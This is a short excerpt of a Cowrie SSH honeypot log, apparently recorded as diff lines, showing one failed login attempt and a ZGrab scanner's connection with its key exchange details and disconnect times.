+2024-06-07T21:53:39.096911Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root1' failed auth b'password'
+2024-06-07T21:53:39.097144Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:39.250954Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:53:39.251154Z [HoneyPotSSHTransport,152,183.99.4.254] Connection lost after 3 seconds
+2024-06-07T22:31:37.702690Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 198.235.24.164:60662 (172.31.41.134:2222) [session: dc3de44fd2f0]
+2024-06-07T22:31:38.532076Z [HoneyPotSSHTransport,153,198.235.24.164] Remote SSH version: SSH-2.0-ZGrab ZGrab SSH Survey
+2024-06-07T22:31:39.523436Z [HoneyPotSSHTransport,153,198.235.24.164] SSH client hassh fingerprint: dd9bcf093c355da7000132131cb36fd0
+2024-06-07T22:31:39.524809Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group-exchange-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T22:31:39.524925Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-md5' b'none'
+2024-06-07T22:31:39.525019Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-md5' b'none'
+2024-06-07T22:31:42.256128Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T22:31:42.256323Z [HoneyPotSSHTransport,153,198.235.24.164] Connection lost after 4 seconds
